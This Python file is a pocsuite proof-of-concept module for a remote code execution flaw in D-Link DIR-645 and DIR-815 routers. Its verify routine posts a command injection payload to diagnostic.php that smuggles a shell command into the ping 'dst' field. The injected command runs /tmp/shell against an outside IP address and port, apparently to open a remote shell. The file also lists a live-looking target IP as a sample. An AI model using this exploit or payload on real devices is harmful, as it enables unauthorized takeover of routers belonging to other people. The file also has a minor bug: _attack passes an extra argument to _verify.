#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register


class TestPOC(POCBase):
    name = "D-Link DIR-645 & DIR-815 RCE"
    vulID = ''
    author = ['sebao']
    vulType = 'Code Execution'
    version = '1.0'  # default version: 1.0
    references = 'http://www.s3cur1ty.de/m1adv2013-017'
    desc = 'Module exploits D-Link DIR-645 and DIR-815 Remote Code Execution vulnerability which allows executing command on the device.'


    vulDate = ''
    createDate = '2017-10-16'
    updateDate = '2017-10-16'

    appName = 'D-Link'
    appVersion = 'DIR-815 v1.03b02, DIR-645 v1.02,DIR-645 v1.03.DIR-600 below v2.16b01,DIR-300 revB v2.13b01'
    dork = ''
    appPowerLink = 'http://www.dlink.com'
    samples = ['http://59.124.11.53']

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}

        url = self.url + '/diagnostic.php'
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = "act=ping&dst=%26 /tmp/shell 207.246.96.35 8889%26"

        resp = req.post(url,headers=headers,data=data)
        if resp.status_code == 200 and "<report>OK</report>" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url


        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
